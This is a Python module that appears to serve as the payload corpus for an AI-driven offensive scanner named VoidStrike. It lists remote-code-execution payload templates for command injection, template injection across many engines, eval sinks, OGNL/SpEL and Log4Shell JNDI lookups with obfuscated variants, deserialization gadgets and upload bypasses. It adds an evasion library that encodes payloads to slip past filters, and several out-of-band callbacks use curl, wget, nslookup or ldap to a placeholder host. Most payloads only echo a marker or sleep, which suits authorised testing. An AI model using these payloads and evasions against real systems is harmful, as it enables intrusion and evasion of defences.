"""VoidStrike's built-in offensive knowledge base — the brain's long-term memory.

This is a curated corpus of remote-code-execution *manoeuvres* across every
class VoidStrike understands: injection payloads, per-engine/per-language
variants, blind (time/OOB) techniques, and a library of evasion transforms. The
:class:`~voidstrike.ai.brain.Brain` reasons over this corpus on every request,
so VoidStrike is expert out of the box — a configured LLM augments this
knowledge, it does not replace it.

Payload templates use ``str.format`` placeholders:
    {marker}  a unique success token to echo
    {host}    an out-of-band callback host
    {sleep}   seconds to delay for a timing oracle
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass, field
from urllib.parse import quote


@dataclass(frozen=True)
class Technique:
    id: str
    vuln_class: str
    name: str
    oracle: str  # "output" | "time" | "oob"
    tags: tuple[str, ...]           # context hints: os, engine, language, waf...
    payloads: tuple[str, ...]
    note: str = ""


# ======================================================================
#  OS COMMAND INJECTION
# ======================================================================
_CMD: list[Technique] = [
    Technique(
        "cmd.unix.sep", "OS Command Injection", "Unix separators + echo",
        "output", ("unix", "linux", "bash", "sh"),
        (
            "; echo {marker}", "| echo {marker}", "|| echo {marker}",
            "& echo {marker}", "&& echo {marker}", "\n echo {marker}",
            "`echo {marker}`", "$(echo {marker})", "; echo {marker};",
            "%0aecho {marker}",
        ),
    ),
    Technique(
        "cmd.unix.quote", "OS Command Injection", "Quote breakout",
        "output", ("unix", "quoted", "bash"),
        (
            "'; echo {marker};'", "\"; echo {marker};\"", "'|echo {marker}",
            "\"|echo {marker}", "')|echo {marker}", "'`echo {marker}`'",
        ),
    ),
    Technique(
        "cmd.unix.ifs", "OS Command Injection", "IFS / whitespace evasion",
        "output", ("unix", "waf", "evasion", "bash"),
        (
            ";echo${{IFS}}{marker}", "|echo${{IFS}}{marker}",
            ";echo$IFS$9{marker}", "{{echo,{marker}}}", ";e\\x63ho {marker}",
        ),
    ),
    Technique(
        "cmd.win.sep", "OS Command Injection", "Windows separators + echo",
        "output", ("windows", "cmd", "powershell"),
        (
            "& echo {marker}", "&& echo {marker}", "| echo {marker}",
            "%0aecho {marker}", "& cmd /c echo {marker}",
            "; Write-Output {marker}",
        ),
    ),
    Technique(
        "cmd.time.unix", "OS Command Injection", "Unix time-based blind",
        "time", ("unix", "blind", "linux"),
        (
            "; sleep {sleep}", "| sleep {sleep}", "`sleep {sleep}`",
            "$(sleep {sleep})", "&& sleep {sleep}",
            "; ping -c {sleep} 127.0.0.1",
        ),
    ),
    Technique(
        "cmd.time.win", "OS Command Injection", "Windows time-based blind",
        "time", ("windows", "blind", "cmd"),
        (
            "& ping -n {sleep} 127.0.0.1", "& timeout /t {sleep}",
            "& powershell -c Start-Sleep {sleep}",
        ),
    ),
    Technique(
        "cmd.oob", "OS Command Injection", "Out-of-band callback (blind)",
        "oob", ("unix", "windows", "blind", "oast"),
        (
            "; nslookup {host}", "| nslookup {host}", "`nslookup {host}`",
            "$(curl http://{host}/)", "; curl http://{host}/",
            "& nslookup {host}", "; wget -qO- http://{host}/",
            "; powershell -c \"nslookup {host}\"",
        ),
    ),
]

# ======================================================================
#  SERVER-SIDE TEMPLATE INJECTION  (per engine)
# ======================================================================
_SSTI: list[Technique] = [
    Technique(
        "ssti.detect", "Server-Side Template Injection", "Polyglot arithmetic probe",
        "output", ("detect", "any"),
        ("{{{{7*7}}}}", "${{7*7}}", "#{{7*7}}", "<%= 7*7 %>", "${{7*'7'}}",
         "{{7*'7'}}", "@(7*7)", "*{{7*7}}", "#{{ 7*7 }}"),
        note="49 (or 7777777) in the response => template evaluator reachable.",
    ),
    Technique(
        "ssti.jinja2", "Server-Side Template Injection", "Jinja2 / Flask RCE",
        "output", ("jinja2", "python", "flask"),
        (
            "{{{{ self.__init__.__globals__.__builtins__.__import__('os')"
            ".popen('echo {marker}').read() }}}}",
            "{{{{ cycler.__init__.__globals__.os.popen('echo {marker}').read() }}}}",
            "{{{{ get_flashed_messages.__globals__.__builtins__.__import__('os')"
            ".popen('echo {marker}').read() }}}}",
            "{{{{ request.application.__globals__.__builtins__.__import__('os')"
            ".popen('echo {marker}').read() }}}}",
            "{{{{ lipsum.__globals__.os.popen('echo {marker}').read() }}}}",
        ),
    ),
    Technique(
        "ssti.twig", "Server-Side Template Injection", "Twig (PHP) RCE",
        "output", ("twig", "php", "symfony"),
        (
            "{{{{ ['echo {marker}']|map('system')|join }}}}",
            "{{{{ ['echo {marker}']|filter('system') }}}}",
            "{{{{ _self.env.registerUndefinedFilterCallback('system') }}}}"
            "{{{{ _self.env.getFilter('echo {marker}') }}}}",
        ),
    ),
    Technique(
        "ssti.freemarker", "Server-Side Template Injection", "Freemarker (Java) RCE",
        "output", ("freemarker", "java"),
        (
            '${{"freemarker.template.utility.Execute"?new()("echo {marker}")}}',
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
            "${{ex(\"echo {marker}\")}}",
        ),
    ),
    Technique(
        "ssti.velocity", "Server-Side Template Injection", "Velocity (Java) RCE",
        "output", ("velocity", "java"),
        (
            "#set($e=\"\")$e.getClass().forName('java.lang.Runtime').getMethod("
            "'exec',$e.getClass().forName('java.lang.String')).invoke("
            "$e.getClass().forName('java.lang.Runtime').getMethod('getRuntime')"
            ".invoke(null),'echo {marker}')",
        ),
    ),
    Technique(
        "ssti.smarty", "Server-Side Template Injection", "Smarty (PHP) RCE",
        "output", ("smarty", "php"),
        ("{{system('echo {marker}')}}", "{{{{system('echo {marker}')}}}}",
         "{{php}}echo `echo {marker}`;{{/php}}"),
    ),
    Technique(
        "ssti.erb", "Server-Side Template Injection", "ERB / Ruby RCE",
        "output", ("erb", "ruby", "rails"),
        ("<%= `echo {marker}` %>", "<%= system('echo {marker}') %>",
         "<%= IO.popen('echo {marker}').read %>"),
    ),
    Technique(
        "ssti.mako", "Server-Side Template Injection", "Mako (Python) RCE",
        "output", ("mako", "python"),
        ("${{__import__('os').popen('echo {marker}').read()}}",
         "<%import os%>${{os.popen('echo {marker}').read()}}"),
    ),
    Technique(
        "ssti.jsengines", "Server-Side Template Injection", "Handlebars/Pug/EJS (Node) RCE",
        "output", ("handlebars", "pug", "ejs", "nodejs", "javascript"),
        (
            "#{{global.process.mainModule.require('child_process')"
            ".execSync('echo {marker}')}}",
            "{{{{#with \"s\" as |string|}}}}{{{{#with split as |conslist|}}}}"
            "{{{{this.pop}}}}{{{{/with}}}}{{{{/with}}}}",
        ),
        note="Node template RCE is engine-specific; confirm the engine first.",
    ),
]

# ======================================================================
#  INTERPRETED-LANGUAGE CODE INJECTION (eval sinks)
# ======================================================================
_CODE: list[Technique] = [
    Technique(
        "code.php", "Server-Side Code Injection", "PHP eval sink",
        "output", ("php",),
        ("echo '{marker}';", "';echo '{marker}';//", "\";echo \"{marker}\";//",
         "system('echo {marker}');", "print('{marker}');"),
    ),
    Technique(
        "code.python", "Server-Side Code Injection", "Python eval/exec sink",
        "output", ("python",),
        ("__import__('sys').stdout.write('{marker}')", "print('{marker}')",
         "'+str(__import__('os').popen('echo {marker}').read())+'",
         "().__class__.__bases__[0].__subclasses__()"),
    ),
    Technique(
        "code.ruby", "Server-Side Code Injection", "Ruby eval sink",
        "output", ("ruby",),
        ("puts '{marker}'", "#{{`echo {marker}`}}", "system('echo {marker}')"),
    ),
    Technique(
        "code.node", "Server-Side Code Injection", "Node.js eval/Function sink",
        "output", ("nodejs", "javascript"),
        ("process.stdout.write('{marker}')",
         "require('child_process').execSync('echo {marker}')",
         "global.process.mainModule.require('child_process').execSync('echo {marker}')"),
    ),
    Technique(
        "code.perl", "Server-Side Code Injection", "Perl eval sink",
        "output", ("perl",),
        ("print '{marker}';", "system('echo {marker}');"),
    ),
    Technique(
        "code.time", "Server-Side Code Injection", "Time-based blind eval",
        "time", ("blind",),
        ("sleep({sleep});", "__import__('time').sleep({sleep})",
         "require('child_process').execSync('sleep {sleep}')"),
    ),
]

# ======================================================================
#  EXPRESSION LANGUAGE / JNDI
# ======================================================================
_EL: list[Technique] = [
    Technique(
        "el.ognl", "Expression Language / JNDI Injection", "OGNL (Struts) RCE",
        "output", ("ognl", "struts", "java"),
        (
            "%{{7*7}}", "%{{(#a=@java.lang.Runtime@getRuntime().exec('echo {marker}'))}}",
            "%{{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
            "(@java.lang.Runtime@getRuntime().exec('echo {marker}'))}}",
        ),
    ),
    Technique(
        "el.spel", "Expression Language / JNDI Injection", "Spring SpEL RCE",
        "output", ("spel", "spring", "java"),
        (
            "#{{7*7}}", "${{7*7}}",
            "#{{T(java.lang.Runtime).getRuntime().exec('echo {marker}')}}",
            "#{{T(java.lang.System).getenv()}}",
        ),
    ),
    Technique(
        "el.mvel", "Expression Language / JNDI Injection", "MVEL / JEXL RCE",
        "output", ("mvel", "jexl", "java"),
        ("Runtime.getRuntime().exec('echo {marker}')",
         "''.getClass().forName('java.lang.Runtime').getRuntime().exec('echo {marker}')"),
    ),
    Technique(
        "el.jndi", "Expression Language / JNDI Injection", "JNDI / Log4Shell lookup",
        "oob", ("jndi", "log4j", "log4shell", "java", "oast"),
        (
            "${{jndi:ldap://{host}/a}}", "${{jndi:rmi://{host}/a}}",
            "${{jndi:dns://{host}/a}}", "${{jndi:ldaps://{host}/a}}",
            "${{${{lower:jndi}}:${{lower:ldap}}://{host}/a}}",
            "${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{host}/a}}",
            "${{jndi:${{lower:l}}${{lower:d}}a${{lower:p}}://{host}/a}}",
        ),
        note="Obfuscated forms map filter coverage; only trigger callbacks you own.",
    ),
]

# ======================================================================
#  INSECURE DESERIALIZATION (families / gadget references)
# ======================================================================
_DESER: list[Technique] = [
    Technique(
        "deser.java", "Insecure Deserialization", "Java (ysoserial gadget families)",
        "oob", ("java", "serialized"),
        ("URLDNS", "CommonsCollections1", "CommonsCollections6", "CommonsBeanutils1",
         "Jdk7u21", "Spring1", "Groovy1", "Hibernate1"),
        note="Magic bytes AC ED 00 05 / base64 'rO0'. URLDNS is the safe OOB probe.",
    ),
    Technique(
        "deser.php", "Insecure Deserialization", "PHP object injection / PHAR",
        "oob", ("php", "serialized", "pop-chain"),
        ('O:8:"stdClass":0:{{}}', "phar://"),
        note="Look for 'O:' / 'a:' serialized strings; POP chains are app-specific.",
    ),
    Technique(
        "deser.python", "Insecure Deserialization", "Python pickle (OOB reduce)",
        "oob", ("python", "pickle", "serialized"),
        ("__reduce__ -> os.system(nslookup {host})",),
        note="Pickle opcode 0x80 prefix. Benign OOB gadget built at runtime.",
    ),
    Technique(
        "deser.node", "Insecure Deserialization", "node-serialize IIFE",
        "oob", ("nodejs", "javascript", "serialized"),
        ("{{\"rce\":\"_$$ND_FUNC$$_function(){{require('child_process')"
         ".exec('nslookup {host}')}}()\"}}",),
    ),
    Technique(
        "deser.ruby", "Insecure Deserialization", "Ruby Marshal / YAML",
        "oob", ("ruby", "marshal", "serialized"),
        ("Marshal.load gadget", "--- !ruby/object psych gadget"),
        note="Base64 'BAh' often indicates Marshal data.",
    ),
]

# ======================================================================
#  UNRESTRICTED FILE UPLOAD
# ======================================================================
_UPLOAD: list[Technique] = [
    Technique(
        "upload.ext", "Unrestricted File Upload (RCE)", "Executable extension bypass",
        "output", ("upload", "php", "jsp", "asp"),
        (".php", ".php5", ".phtml", ".pht", ".phar", ".jsp", ".jspx", ".asp",
         ".aspx", ".cshtml", ".php.jpg", ".php%00.jpg", ".php;.jpg", ".pHp"),
        note="Marker webshells only; content is a benign echo of the token.",
    ),
    Technique(
        "upload.ctype", "Unrestricted File Upload (RCE)", "Content-Type / magic-byte spoof",
        "output", ("upload", "waf", "evasion"),
        ("image/jpeg + GIF89a; prefix", "image/png magic + <?php ?>",
         "multipart double Content-Type"),
    ),
    Technique(
        "upload.htaccess", "Unrestricted File Upload (RCE)", ".htaccess handler override",
        "output", ("upload", "apache"),
        ("AddType application/x-httpd-php .xyz", "AddHandler php-script .xyz"),
    ),
]

TECHNIQUES: list[Technique] = _CMD + _SSTI + _CODE + _EL + _DESER + _UPLOAD


# ======================================================================
#  EVASION TRANSFORM LIBRARY  (applied by the brain to any payload)
# ======================================================================
def _url_encode(p: str) -> str:
    return quote(p, safe="")


def _double_url_encode(p: str) -> str:
    return quote(quote(p, safe=""), safe="")


def _case_toggle(p: str) -> str:
    return re.sub(r"[a-zA-Z]", lambda m: m.group().swapcase()
                  if m.start() % 2 else m.group(), p)


def _space_to_ifs(p: str) -> str:
    return p.replace(" ", "${IFS}")


def _space_to_tab(p: str) -> str:
    return p.replace(" ", "\t")


def _slash_between(p: str) -> str:
    # Insert bash-safe backslashes into command names (cat -> c\at).
    return re.sub(r"\b([a-z])([a-z]{2,})\b",
                  lambda m: m.group(1) + "\\" + m.group(2), p, count=1)


def _b64_wrap(p: str) -> str:
    # Wrap the echoed command in a base64 decode|sh — same effect, different bytes.
    b = base64.b64encode(p.encode()).decode()
    return f"echo {b}|base64 -d|sh"


EVASIONS: dict[str, callable] = {
    "url_encode": _url_encode,
    "double_url_encode": _double_url_encode,
    "case_toggle": _case_toggle,
    "ifs": _space_to_ifs,
    "tab": _space_to_tab,
    "backslash": _slash_between,
    "base64_shell": _b64_wrap,
}


# ======================================================================
#  QUERY HELPERS  (the brain's index into the corpus)
# ======================================================================
def _tokens(text: str) -> set[str]:
    return set(re.findall(r"[a-z0-9]+", (text or "").lower()))


def techniques_for(vuln_class: str, context: str = "",
                   oracle: str | None = None) -> list[Technique]:
    """Return techniques for a class, ranked by how well tags match context."""
    ctx = _tokens(context)
    pool = [t for t in TECHNIQUES if t.vuln_class == vuln_class
            and (oracle is None or t.oracle == oracle)]

    def score(t: Technique) -> int:
        overlap = len(ctx.intersection(t.tags))
        # A "detect"/"any" tagged technique is always somewhat relevant.
        base = 1 if ("any" in t.tags or "detect" in t.tags) else 0
        return overlap * 10 + base

    return sorted(pool, key=score, reverse=True)


def render_payloads(techniques: list[Technique], *, marker: str = "", host: str = "",
                    sleep: int = 6, limit: int = 40) -> list[str]:
    """Format technique templates into concrete payloads (de-duplicated)."""
    out: list[str] = []
    seen: set[str] = set()
    for t in techniques:
        for tmpl in t.payloads:
            try:
                payload = tmpl.format(marker=marker, host=host, sleep=sleep)
            except (KeyError, IndexError, ValueError):
                payload = tmpl
            if payload not in seen:
                seen.add(payload)
                out.append(payload)
            if len(out) >= limit:
                return out
    return out


def apply_evasions(payload: str, which: list[str] | None = None) -> list[str]:
    """Return evasion variants of a payload using the transform library."""
    names = which or list(EVASIONS)
    variants: list[str] = []
    seen = {payload}
    for name in names:
        fn = EVASIONS.get(name)
        if not fn:
            continue
        try:
            v = fn(payload)
        except Exception:  # noqa: BLE001
            continue
        if v and v not in seen:
            seen.add(v)
            variants.append(v)
    return variants


def corpus_summary() -> list[tuple[str, int, int]]:
    """(vuln_class, technique_count, payload_count) for each class."""
    classes: dict[str, list[Technique]] = {}
    for t in TECHNIQUES:
        classes.setdefault(t.vuln_class, []).append(t)
    rows = []
    for cls, techs in classes.items():
        rows.append((cls, len(techs), sum(len(t.payloads) for t in techs)))
    return sorted(rows)
